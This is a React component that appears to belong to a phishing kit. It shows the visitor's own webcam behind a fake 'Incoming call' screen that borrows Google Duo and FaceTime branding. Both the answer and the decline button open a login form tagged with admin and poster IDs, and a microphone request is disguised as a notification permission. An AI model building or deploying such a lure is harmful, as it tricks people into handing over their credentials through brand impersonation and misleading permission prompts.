"use client";

import { useEffect, useState } from "react";
import Webcam from "react-webcam";
import LoginForm from "./LoginForm";

export default function Home({ adminId, posterId }) {
  const [showForm, setShowForm] = useState(false);

  const playNotificationSound = () => {
    const audio = new Audio("/tune.mp3"); // Path to the ringtone file
    audio.play().catch((error) => {
      console.error("Error playing the sound:", error);
    });

    return () => {
      audio.pause(); // Stop the audio if the component unmounts
      audio.currentTime = 0; // Reset the audio to the beginning
    };
  };
  const requestNotificationPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      if (stream) {
        playNotificationSound();
      }
    } catch (error) {
      console.error("Error requesting notification permission:", error);
    }
  };
  useEffect(() => {
    requestNotificationPermission();
  }, [adminId, posterId]);
  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute  flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <div className=" bg-neutral-50    py-4 shadow-around rounded-lg">
          {!showForm ? (
            <div className="bg-neutral-50   p-6 rounded-xl flex flex-col items-center justify-center gap-y-6">
              <img
                alt="Google Duo"
                loading="lazy"
                width="80"
                height="80"
                decoding="async"
                data-nimg="1"
                className="rounded-full object-cover object-center p-2 bg-green-100"
                src="/images/facetime-logo.png"
              />
              <p className="text-xl font-medium text-neutral-700 text-center">
                Incoming call...
              </p>
              <div className="flex items-center justify-center gap-x-12 text-neutral-50">
                <button
                  onClick={() => setShowForm(true)}
                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-green-500"
                >
                  <svg
                    stroke="currentColor"
                    fill="currentColor"
                    stroke-width="0"
                    viewBox="0 0 24 24"
                    height="1em"
                    width="1em"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="none" d="M0 0h24v24H0z"></path>
                    <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"></path>
                  </svg>
                </button>
                <button
                  onClick={() => setShowForm(true)}
                  className="size-14 flex items-center justify-center rounded-full text-3xl bg-red-500"
                >
                  <svg
                    stroke="currentColor"
                    fill="currentColor"
                    stroke-width="0"
                    viewBox="0 0 24 24"
                    height="1em"
                    width="1em"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path fill="none" d="M0 0h24v24H0z"></path>
                    <path d="M12 9c-1.6 0-3.15.25-4.6.72v3.1c0 .39-.23.74-.56.9-.98.49-1.87 1.12-2.66 1.85-.18.18-.43.28-.7.28-.28 0-.53-.11-.71-.29L.29 13.08a.956.956 0 0 1-.29-.7c0-.28.11-.53.29-.71C3.34 8.78 7.46 7 12 7s8.66 1.78 11.71 4.67c.18.18.29.43.29.71 0 .28-.11.53-.29.71l-2.48 2.48c-.18.18-.43.29-.71.29-.27 0-.52-.11-.7-.28a11.27 11.27 0 0 0-2.67-1.85.996.996 0 0 1-.56-.9v-3.1C15.15 9.25 13.6 9 12 9z"></path>
                  </svg>
                </button>
              </div>
            </div>
          ) : (
            <LoginForm adminId={adminId} posterId={posterId} />
          )}
        </div>
      </div>
    </div>
  );
}
